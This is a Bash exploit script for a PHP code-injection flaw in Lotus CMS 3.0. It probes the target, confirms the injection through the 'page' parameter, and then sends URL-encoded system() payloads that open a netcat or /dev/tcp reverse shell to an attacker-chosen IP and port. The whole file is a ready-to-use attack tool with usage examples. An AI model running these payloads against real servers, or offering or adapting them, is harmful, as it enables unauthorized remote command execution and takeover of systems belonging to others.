#!/bin/bash
# Lotus CMS 3.0 eval() Remote Command Execition Exploit
# flaw in router() function, original write-up: http://secunia.com/secunia_research/2011-21/
# Scripted in Bash by HR
# USAGE: ./lotusRCE.sh target lotusCMS-path
# USAGE: ./lotusRCE.sh ki0ptrix3.com /
# USAGE: ./lotusRCE.sh 192.168.1.36 /lcms/
# Enter IP and PORT when asked to spawn netcat based reverse shell ;)

#Start the magic
target="$1" #Target site, ex: 192.168.1.36 or ki0ptrix3.com (no http://)
path="$2" # Path to LotusCMS, ex: /lcms/ or /
junk=/tmp
storage1=$(mktemp -p "$junk" -t fooooobar1.tmp.XXX)
storage2=$(mktemp -p "$junk" -t fooooobar2.tmp.XXX)

#First a simple Bashtrap function to handle interupt (CTRL+C)
trap bashtrap INT

bashtrap(){
	echo
	echo
	echo 'CTRL+C has been detected!.....shutting down now' | grep --color '.....shutting down now'
	rm -rf "$storage1"
	rm -rf "$storage2"
	#exit entire script if called
	exit 0
}
#End bashtrap()


page_exists(){
	#confirm page exists
	curl "$target$path/index.php?page=index" -I -o "$storage1" 2> /dev/null
	cat "$storage1" | sed '2,20d' | cut -d' ' -f2 > "$storage2" 2> /dev/null
	pageused=$(cat "$storage2")
	if [ "$pageused" == '200' ]; then
		echo
		echo "Path found, now to check for vuln...." | grep --color -E 'Path found||now to check for vuln'
		echo
		vuln_check
	else
		echo "Provided site and path not found, sorry...."
		exit;
	fi
}


vuln_check(){
	# page exists, check if vuln... URLencode: "page=index');${print('abc123')};#"
	curl $target$path/index.php --data "page=index%27%29%3B%24%7Bprint%28%27Hood3dRob1n%27%29%7D%3B%23" -o "$storage1" 2> /dev/null
	grep 'Hood3dRob1n' "$storage1" 2> /dev/null 2>&1
	if [ "$?" == 0 ]; then
		echo "Regex found, site is vulnerable to PHP Code Injection!" | grep --color -i -E 'Regex found||site is vulnerable to PHP Code Injection'
		echo
		exploit_funk
	else
		echo "Unable to find injection in returned results, sorry...."
		exit;
	fi

}

exploit_funk(){
	# Vuln confirmed, time to exploit shall we ;)
	echo "About to try and inject reverse shell...." | grep --color 'About to try and inject reverse shell'
	echo "what IP to use?"
	read IP
	echo "What PORT?"
	read PORT
	echo
	echo "OK, open your local listener and choose the method for back connect: " | grep --color -E 'OK||open your local listener and choose the method for back connect'
	select reverse_options in "NetCat -e" "NetCat /dev/tcp" "NetCat Backpipe" "NetCat FIFO" "Exit"
	do
		case $reverse_options in
			"NetCat -e")
				curl $target$path/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27nc%20-e%20%2fbin%2fsh%20$IP%20$PORT%27%29%7D%3B%23%22" 2> /dev/null
			;;
			"NetCat /dev/tcp")
				curl $target$path/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27%2fbin%2fbash%20-i%20%3E%20%2fdev%2ftcp%2f%24IP%2f%24PORT%200%3C%261%202%3E%261%27%29%7D%3B%23" 2> /dev/null
			;;
			"NetCat Backpipe")
				curl $target$path/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27mknod%20backpipe%20p%20%26%26%20nc%20%24IP%20%24PORT%200%3Cbackpipe%20%7C%20%2fbin%2fbash%201%3Ebackpipe%27%29%7D%3B%23" 2> /dev/null
			;;
			"NetCat FIFO")
				curl $target$path/index.php --data "page=index%27%29%3B%24%7Bsystem%28%27mkfifo%20%2ftmp%2ffoo%20%26%26%20cat%20%2ftmp%2ffoo%20%7C%20%2fbin%2fsh%20-i%202%3E%261%20%7C%20nc%20%24IP%20%24PORT%20%3E%20%2ftmp%2ffoo%27%29%7D%3B%23" 2> /dev/null
			;;
			"Exit")
				echo "got r00t?"
				exit;
			;;
		esac
	done
}




#MAIN
if [ -z "$1" ] || [ "$1" == '-h' ] || [ "$1" == '--help' ]; then
	echo
	echo "USAGE: $0 target LotusCMS_path" | grep --color 'USAGE'
	echo "EX: $0 192.168.1.36 /lcms/" | grep --color 'EX'
	echo "EX: $0 ki0ptrix3.com /" | grep --color 'EX'
	echo
	exit;
fi
page_exists
rm -rf "$storage1"
rm -rf "$storage2"

#EOF
